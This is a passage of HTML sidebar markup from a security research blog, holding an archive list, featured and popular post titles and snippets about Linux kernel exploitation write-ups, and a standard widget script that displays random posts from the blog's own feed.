</span>
</a>
<a class="post-count-link" href="https://www.willsroot.io/2022/08/">
August
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://www.willsroot.io/2022/03/">
March
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://www.willsroot.io/2022/01/">
January
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://www.willsroot.io/2021/">
2021
</a>
<span class="post-count" dir="ltr">(10)</span>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://www.willsroot.io/2021/10/">
October
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://www.willsroot.io/2021/08/">
August
</a>
<span class="post-count" dir="ltr">(3)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://www.willsroot.io/2021/07/">
July
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://www.willsroot.io/2021/04/">
April
</a>
<span class="post-count" dir="ltr">(2)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://www.willsroot.io/2021/03/">
March
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://www.willsroot.io/2021/02/">
February
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://www.willsroot.io/2021/01/">
January
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://www.willsroot.io/2020/">
2020
</a>
<span class="post-count" dir="ltr">(10)</span>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://www.willsroot.io/2020/12/">
December
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://www.willsroot.io/2020/11/">
November
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://www.willsroot.io/2020/10/">
October
</a>
<span class="post-count" dir="ltr">(2)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://www.willsroot.io/2020/06/">
June
</a>
<span class="post-count" dir="ltr">(3)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://www.willsroot.io/2020/05/">
May
</a>
<span class="post-count" dir="ltr">(2)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://www.willsroot.io/2020/04/">
April
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://www.willsroot.io/2019/">
2019
</a>
<span class="post-count" dir="ltr">(19)</span>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://www.willsroot.io/2019/11/">
November
</a>
<span class="post-count" dir="ltr">(2)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://www.willsroot.io/2019/10/">
October
</a>
<span class="post-count" dir="ltr">(6)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://www.willsroot.io/2019/09/">
September
</a>
<span class="post-count" dir="ltr">(6)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://www.willsroot.io/2019/08/">
August
</a>
<span class="post-count" dir="ltr">(3)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://www.willsroot.io/2019/06/">
June
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://www.willsroot.io/2019/03/">
March
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://www.willsroot.io/2016/">
2016
</a>
<span class="post-count" dir="ltr">(1)</span>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://www.willsroot.io/2016/07/">
July
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
</li>
</ul>
</div>
</div>
<div class="clear"></div>
</div>
</div><div class="widget FeaturedPost" data-version="1" id="FeaturedPost1">
<h2 class="title">Featured Post</h2>
<div class="post-summary">
<h3><a href="https://www.willsroot.io/2021/08/corctf-2021-fire-of-salvation-writeup.html">corCTF 2021 Fire of Salvation Writeup: Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel</a></h3>
<p>
In corCTF 2021, D3v17  and I wrote two kernel challenges utilizing a technique that is novel at least to our knowledge to gain arb read and ...
</p>
<img class="image" src="./Will&#39;s Root_ corCTF 2023 sysruption - Exploiting Sysret on Linux in 2023_files/1.png">
</div>
<style type="text/css">
    .image {
      width: 100%;
    }
  </style>
<div class="clear"></div>
</div><div class="widget PopularPosts" data-version="1" id="PopularPosts1">
<h2>Popular Posts</h2>
<div class="widget-content popular-posts">
<ul>
<li>
<div class="item-content">
<div class="item-thumbnail">
<a href="https://www.willsroot.io/2022/01/cve-2022-0185.html" target="_blank">
<img alt="" border="0" src="./Will&#39;s Root_ corCTF 2023 sysruption - Exploiting Sysret on Linux in 2023_files/diagram1.png">
</a>
</div>
<div class="item-title"><a href="https://www.willsroot.io/2022/01/cve-2022-0185.html">CVE-2022-0185 - Winning a $31337 Bounty after Pwning Ubuntu and Escaping Google's KCTF Containers</a></div>
<div class="item-snippet">Recently, several friends on my CTF team Crusaders of Rust   and I found a Linux kernel heap overflow 0-day. We found the bug  through fuzzi...</div>
</div>
<div style="clear: both;"></div>
</li>
<li>
<div class="item-content">
<div class="item-thumbnail">
<a href="https://www.willsroot.io/2022/12/entrybleed.html" target="_blank">
<img alt="" border="0" src="./Will&#39;s Root_ corCTF 2023 sysruption - Exploiting Sysret on Linux in 2023_files/demo.gif">
</a>
</div>
<div class="item-title"><a href="https://www.willsroot.io/2022/12/entrybleed.html">EntryBleed: Breaking KASLR under KPTI with Prefetch (CVE-2022-4543)</a></div>
<div class="item-snippet">Recently, I’ve discovered that Linux KPTI has implementation issues that can allow any unprivileged local attacker to bypass KASLR on  Intel...</div>
</div>
<div style="clear: both;"></div>
</li>
<li>
<div class="item-content">
<div class="item-thumbnail">
<a href="https://www.willsroot.io/2021/08/corctf-2021-fire-of-salvation-writeup.html" target="_blank">
<img alt="" border="0" src="./Will&#39;s Root_ corCTF 2023 sysruption - Exploiting Sysret on Linux in 2023_files/1(1).png">
</a>
</div>
<div class="item-title"><a href="https://www.willsroot.io/2021/08/corctf-2021-fire-of-salvation-writeup.html">corCTF 2021 Fire of Salvation Writeup: Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel</a></div>
<div class="item-snippet">In corCTF 2021, D3v17  and I wrote two kernel challenges utilizing a technique that is novel at least to our knowledge to gain arb read and ...</div>
</div>
<div style="clear: both;"></div>
</li>
</ul>
<div class="clear"></div>
</div>
</div><div class="widget HTML" data-version="1" id="HTML1">
<h2 class="title">Interesting Posts</h2>
<div class="widget-content">
<style>
#random-posts img {
    border-radius: 10px;
    float: left;
    margin-right: 5px;
    width: 75px;
    height: 75px;
    transition: all 0.2s linear 0s;
}

#random-posts img:hover {
    opacity: 0.6;
}

ul#random-posts {
    list-style-type: none;
    padding: 0px;
}

#random-posts a {
    font-size: 15px;
    padding: 0px auto 5px;
}

#random-posts a:hover {
    text-decoration: none;
}

.random-summary {
    font-size: 11px;
    background: none;
    padding: 5px;
    margin-right: 8px;
}

#random-posts li {
    margin-bottom: 10px;
    border-bottom: 1px solid #EEEEEE;
    padding: 4px;
}
</style>
<ul id="random-posts">
<script type="text/javaScript">
var randomposts_number = 6;
var randomposts_chars = 110;
var randomposts_details = 'yes';
var randomposts_comments = 'Comments';
var randomposts_commentsd = 'Comments Disabled';
var randomposts_current = [];
var total_randomposts = 0;
var randomposts_current = new Array(randomposts_number);

function randomposts(json) {
    total_randomposts = json.feed.openSearch$totalResults.$t
}
document.write('<script type=\"text/javascript\" src=\"/feeds/posts/default?alt=json-in-script&max-results=0&callback=randomposts\"><\/script>');

function getvalue() {
    for (var i = 0; i < randomposts_number; i++) {
        var found = false;
        var rndValue = get_random();
        for (var j = 0; j < randomposts_current.length; j++) {
            if (randomposts_current[j] == rndValue) {
                found = true;
                break
            }
        };
        if (found) {
            i--
        } else {
            randomposts_current[i] = rndValue
        }
    }
};

function get_random() {
    var ranNum = 1 + Math.round(Math.random() * (total_randomposts - 1));
    return ranNum
};
</script><script type="text/javascript" src="./Will&#39;s Root_ corCTF 2023 sysruption - Exploiting Sysret on Linux in 2023_files/default"></script>
<script type="text/javaScript"> 
function random_posts(json) {
    for (var i = 0; i < randomposts_number; i++) {
        var entry = json.feed.entry[i];
        var randompoststitle = entry.title.$t;
        if ('content' in entry) {
            var randompostsnippet = entry.content.$t
        } else {
            if ('summary' in entry) {
                var randompostsnippet = entry.summary.$t
            } else {
                var randompostsnippet = "";
            }
        };
        randompostsnippet = randompostsnippet.replace(/<[^>]*>/g, "");
        if (randompostsnippet.length < randomposts_chars) {
            var randomposts_snippet = randompostsnippet
        } else {
            randompostsnippet = randompostsnippet.substring(0, randomposts_chars);
            var whitespace = randompostsnippet.lastIndexOf(" ");
            randomposts_snippet = randompostsnippet.substring(0, whitespace) + "&#133;";
        };
        for (var j = 0; j < entry.link.length; j++) {
            if ('thr$total' in entry) {
                var randomposts_commentsnum = entry.thr$total.$t + ' ' + randomposts_comments
            } else {
                randomposts_commentsnum = randomposts_commentsd
            }; if (entry.link[j].rel == 'alternate') {
                var randompostsurl = entry.link[j].href;
                var randomposts_date = entry.published.$t;
                if ('media$thumbnail' in entry) {
                    var randompoststhumb = entry.media$thumbnail.url
                } else {
                    randompoststhumb = "https://3.bp.blogspot.com/-Vq2QZ98cq1M/V3RUcENYgkI/AAAAAAAAAqA/3PhYksj1tX0_3YiZ51aP-rauPp2FRgN9QCK4B/s1057/COOL%2BAUDIO%2BWAVES-for-blog.jpg"
                }
            }
        };
        document.write('<li>');
        document.write('<a href="' + randompostsurl + '" rel="nofollow"><img alt="' + randompoststitle + '" src="' + randompoststhumb + '"/></a>');
        document.write('<div><a href="' + randompostsurl + '" rel="nofollow">' + randompoststitle + '</a></div>');
        if (randomposts_details == 'yes') {
            document.write('<span><div  class="random-info">' + randomposts_date.substring(8, 10) + '.' + randomposts_date.substring(5, 7) + '.' + randomposts_date.substring(0, 4) + ' - ' + randomposts_commentsnum) + '</div></span>'
        };
        document.write('<br/><div class="random-summary">' + randomposts_snippet + '</div><div style="clear:both"></div></li>')
    }
};
getvalue();
for (var i = 0; i < randomposts_number; i++) {
    document.write('<script type=\"text/javascript\" src=\"/feeds/posts/default?alt=json-in-script&start-index=' + randomposts_current[i] + '&max-results=1&callback=random_posts\"><\/script>')
};
</script><script type="text/javascript" src="./Will&#39;s Root_ corCTF 2023 sysruption - Exploiting Sysret on Linux in 2023_files/default(1)"></script><li><a href="https://www.willsroot.io/2021/01/rope2-hackthebox-writeup-chromium-v8.html" rel="nofollow"><img alt="Rope2 HackTheBox Writeup (Chromium V8, FSOP + glibc heap, Linux Kernel heap pwnable)" src="./Will&#39;s Root_ corCTF 2023 sysruption - Exploiting Sysret on Linux in 2023_files/Capture.JPG"></a><div><a href="https://www.willsroot.io/2021/01/rope2-hackthebox-writeup-chromium-v8.html" rel="nofollow">Rope2 HackTheBox Writeup (Chromium V8, FSOP + glibc heap, Linux Kernel heap pwnable)</a></div><span><div class="random-info">16.01.2021 - 1 Comments<br><div class="random-summary">Rope2 by R4J has been my favorite box on HackTheBox by far. It wasn't really related to pentesting, but was…</div><div style="clear:both"></div></div></span></li><script type="text/javascript" src="./Will&#39;s Root_ corCTF 2023 sysruption - Exploiting Sysret on Linux in 2023_files/default(2)"></script></ul></div></div></div></aside></div></div></div></div></div></div></div></div></div></div></div></body></html>